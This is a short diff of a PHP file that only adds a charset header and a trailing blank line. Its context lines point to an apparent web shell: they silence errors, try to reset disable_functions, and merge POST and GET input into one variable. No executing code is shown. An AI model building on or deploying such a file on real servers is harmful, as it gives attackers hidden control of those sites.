@@ -9,6 +9,7 @@ error_reporting(0);
 	@ini_set('output_buffering',0);
 	@ini_set('display_errors', 0);
 	@ini_set('disable_functions', 0);
+header("Content-Type: text/html; charset=utf-8");
 	session_start();
 	date_default_timezone_set("Asia/Jakarta");
 	$_7 = array_merge($_POST, $_GET);
@@ -771,4 +772,5 @@ echo "</center></td><td><center>
 
 echo '</tr></td></table></table>';
 author();
+
 ?>
